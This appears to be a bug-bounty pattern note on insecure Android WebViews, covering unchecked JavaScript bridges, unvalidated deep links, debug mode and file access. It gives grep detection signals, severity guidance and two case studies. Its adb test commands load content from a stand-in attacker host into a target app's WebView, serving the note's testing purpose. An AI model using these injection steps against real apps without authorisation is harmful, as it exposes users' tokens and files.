---
type: pattern
title: "Pattern - Insecure Android WebView"
tags: [pattern, cwe-749, android, webview, mobile, javascript-bridge, deep-link, bb-pattern]
status: verified
vuln_class: access-control
severity_range: P2-P3
seen_in: [android-webview, android-messaging-app, android-social-app]
prerequisites: ["decompiled APK", "a content-injection primitive (open redirect / XSS) or an unrestricted deep-link scheme"]
last_updated: 2026-06-03
---

# Pattern - Insecure Android WebView

> **TL;DR**: A WebView with JavaScript enabled plus `addJavascriptInterface` (or a JS-enabled WebView reachable through an unvalidated deep link) and no origin check turns any content-injection primitive into full access to the native JS bridge. Add hardcoded debug mode or broad file-access flags and the impact climbs from data leak to local device compromise. Any content-injection path — open redirect, reflected XSS, unvalidated `intent://` fallback — can trigger a bridge method call.

## Trigger / When to look

- The target ships an Android app with an in-app browser / help-center / SSO WebView component.
- `WebSettings.setJavaScriptEnabled(true)` appears anywhere near a `WebView` that also loads non-first-party or attacker-influenceable content.
- The app registers custom URI schemes or exported activities that ultimately load a URL into a WebView.

## Detection Signals

| Signal | Grep keyword | Meaning |
|--------|--------------|---------|
| JS enabled | `setJavaScriptEnabled(true)` | Baseline precondition |
| Hardcoded debug mode | `setWebContentsDebuggingEnabled(true)` | Production `adb` / Chrome DevTools attach |
| Unrestricted JS bridge | `addJavascriptInterface` with no origin check | Attack-surface sizing |
| Mixed content | `MIXED_CONTENT_ALWAYS_ALLOW` | HTTP downgrade path |
| Cleartext traffic | `cleartextTrafficPermitted` | Network Security Config override |
| Deep link with no host restriction | `<data android:scheme=` without `android:host=` | Entry point for any app/webpage |
| `intent://` fallback | `browser_fallback_url` | URL-injection path into the WebView |
| Exported WebView activity | `android:exported="true"` on a WebView-hosting Activity | Any app can trigger it |
| Broad file access | `setAllowFileAccess(true)` / `setAllowFileAccessFromFileURLs(true)` | Local file read via `file://` |

## Test / Grep Methodology

```bash
# 1. Decompile
jadx -d ./decompiled target.apk

# 2. Full sweep of WebView settings
grep -rn "setJavaScriptEnabled\|addJavascriptInterface\|setWebContentsDebuggingEnabled" \
  ./decompiled/sources/ -l

# 3. Mixed content + Network Security Config
grep -rn "MIXED_CONTENT\|cleartextTrafficPermitted" ./decompiled/sources/ ./decompiled/resources/

# 4. Enumerate bridge methods
grep -rn "@JavascriptInterface" ./decompiled/sources/ | wc -l
grep -rn "@JavascriptInterface" ./decompiled/sources/ -A 5 | grep "def\|void\|String\|int"

# 5. Confirm origin validation is absent
grep -rn "getUrl\|getOrigin\|getAllowedOrigin\|checkOrigin" ./decompiled/sources/

# 6. Exported Activity hosting a WebView
grep -rn 'exported="true"' ./decompiled/resources/AndroidManifest.xml -A 3 | grep -i "activity"
# cross-reference against Activity classes that instantiate a WebView

# 7. Deep-link scheme with no host restriction
grep -rn "android:scheme" ./decompiled/resources/AndroidManifest.xml | grep -v "android:host"

# 8. intent:// fallback URL with no validation
grep -rn "browser_fallback_url\|intent://\|shouldOverrideUrlLoading" ./decompiled/sources/

# 9. File access flags
grep -rn "setAllowFileAccess\|setAllowUniversalAccessFromFileURLs" ./decompiled/sources/
```

### Dynamic verification (adb)

```bash
# Confirm the debug WebView is attachable
adb devices
# Chrome -> chrome://inspect/#devices -> the WebView tab appearing confirms it

# Trigger a deep link (simulating a malicious app sending an intent)
adb shell am start -a android.intent.action.VIEW \
  -d "acmeapp://ViewHtmlActivity?url=https://attacker.example.com/xss.html" \
  com.acme.app

# Trigger an intent:// fallback
adb shell am start -a android.intent.action.VIEW \
  -d "intent://fake#Intent;scheme=http;S.browser_fallback_url=https://attacker.example.com;end"
```

## Variants

### Variant A — JS bridge with no origin check

`addJavascriptInterface` exposes a large number of native methods with no origin/scheme validation. Any content-injection primitive the attacker can reach (open redirect, XSS, mixed-content downgrade, etc.) lets them invoke every exposed method.

The ceiling depends on what the bridge methods do: token leak, PII read, file operations, and camera/sensor triggers have all been observed in real bridges of this shape.

### Variant B — Unvalidated deep link + `intent://` fallback

The app's custom scheme has no `android:host` restriction, and the WebView's `intent://browser_fallback_url` handling does not validate the target domain. Any app or webpage can redirect the victim into an attacker-controlled URL loaded with JavaScript enabled — a cross-app content-injection primitive.

### Variant C — Debug WebView left on in production

`setWebContentsDebuggingEnabled(true)` hardcoded unconditionally. Anyone with local device access (USB, or ADB-over-network if enabled) can attach Chrome DevTools directly — no vulnerability chain required to inspect state, read storage, or invoke bridge methods.

### Variant D — File access + exported activity (generic)

`setAllowFileAccess(true)` on a WebView hosted by an exported Activity that another app can trigger, loading a `file:///data/data/<package>/` path to read shared preferences / SQLite databases / session tokens. Typically requires either an old target SDK or `setAllowUniversalAccessFromFileURLs(true)` explicitly enabled.

## Case Studies

### Case A — production messaging app

An in-app browser Activity registered three JS interfaces on the same WebView, none of them origin-gated:

```java
WebView.setWebContentsDebuggingEnabled(true);                    // hardcoded true, still on in production
ws.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);  // HTTP+HTTPS mixed content
// network_security_config.xml: cleartextTrafficPermitted="true"

webView.addJavascriptInterface(new NativeBridgeImpl(), "nativeBridge"); // 67 methods, 0 origin check
webView.addJavascriptInterface(new BlobDownloader(), "BlobDownloader");
webView.addJavascriptInterface(new AuthBridge(), "authBridge");         // allowedOriginRules = {"*"}
```

All 67 bridge methods lacked origin validation, including an SSO-token-leaking dialog opener, a file-permission setter, a file-delete method, a current-user getter, a location getter, and a camera/video trigger.

Verified by full APK decompilation, a complete 67-method map, and a successful `adb`/`chrome://inspect` attach.

### Case B — production social app

A `ViewHtmlActivity`-style component was reachable through a custom deep-link scheme with no host restriction:

```xml
<!-- AndroidManifest.xml -->
<data android:scheme="acmeapp" />
```

```java
// ViewHtmlActivity-equivalent
ws.setJavaScriptEnabled(true);
// shouldOverrideUrlLoading(): intent:// -> extracts browser_fallback_url -> loadUrl() directly, no validation
```

Any app or webpage could send an `acmeapp://` intent to trigger this Activity and load an attacker-controlled URL into a JS-enabled WebView. Chained with a separate FileProvider misconfiguration in the same app, this allowed reading arbitrary device files.

## Severity Guide

| Condition | Severity | Notes |
|-----------|----------|-------|
| Large JS bridge + content-injection path + exported | P2 High (~7.5) | Case A shape; requires an injection primitive first |
| Unvalidated deep link + JS enabled + `intent://` fallback | P3 Medium (~6.1) | Case B shape; any app can trigger |
| Debug WebView hardcoded in production | P3 Medium (~5.4) | Requires physical USB or ADB-over-network |
| JS bridge that directly leaks SSO/session tokens | P2 High (~7.4) | Conditional; usually needs an enterprise-account context |
| File access + `file://` read of session storage | P2 High (~7.5) | Easier to build a complete PoC for |
| JS enabled only, no bridge, no file access | P4-P5 | Needs a separate XSS injection first; low standalone impact |

## Stop-Loss

- If `addJavascriptInterface` is used but every exposed method is already gated by an origin/scheme check that you can confirm in code, this is not the pattern — move on.
- If the deep link has both `android:scheme` and `android:host` locked down, the cross-app injection primitive doesn't exist; look elsewhere.
- Don't file "WebView loads external URL" alone — you need either a working content-injection path (Variant A/B) or a directly reachable sensitive method (Variant C/D).

## Submission Requirements

- List every affected bridge method (total count + the 3-5 highest-risk ones).
- Explain the path used to obtain the content-injection primitive (open redirect, deep link, etc.) — don't hand-wave it.
- Provide an `adb` attach screenshot or a working PoC page.

## References

- [[Pattern - Android Config Files Business Intelligence]] — WebView debug mode can sometimes expose PII stored in app config files
- [[Pattern - Account Enumeration Oracle]] — bridge methods like a "get current user" or "get users by X" getter often double as an enumeration oracle
